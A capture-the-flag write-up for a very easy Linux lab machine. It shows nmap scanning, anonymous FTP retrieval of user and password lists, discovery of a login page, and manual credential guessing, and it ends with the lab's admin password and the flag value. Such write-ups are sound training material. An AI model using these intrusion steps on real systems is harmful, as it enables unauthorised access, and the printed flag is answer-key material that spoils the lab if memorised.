System: Linux
Difficulty: Very Easy

IP Address: 10.129.152.140
# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.152.140 -sC -sV
```

2 Ports are returned, FTP and HTTP.
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.154
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix
```

FTP is examined.
```
kali@kali:~$ ftp 10.129.152.140
```

The file has been successfully downloaded from FTP.
```
Name (10.129.152.140:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||48729|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||45577|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |************************************************************************|    33       42.57 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.98 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||44955|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |************************************************************************|    62      152.51 KiB/s    00:00 ETA
226 Transfer complete.
```

Based on the file contents, those are valid wordlists.
```
kali@kali:~$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
```

```
kali@kali:~$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

The Webpage is examined, but no login form or interesting links are present.
Based on Directory Enumeration, a login page has been found on the Web Server.
```
<SNIP>
[21:35:52] 200 -  718B  - /login.php
[21:35:52] 302 -    0B  - /logout.php  ->  login.php
<SNIP>
```

This link is now explored in the web browser.
```
http://10.129.152.140/login.php
```

![[crocodile_1.png]]

The user and the password combinations are tried one-by-one from the previous wordlists.
Those credentials worked successfully.
```
admin:rKXM59ESxesUFHAd
```

![[crocodile_2.png]]

The flag contents is below.
```
c7110277ac44d78b6a9fff2232434d16
```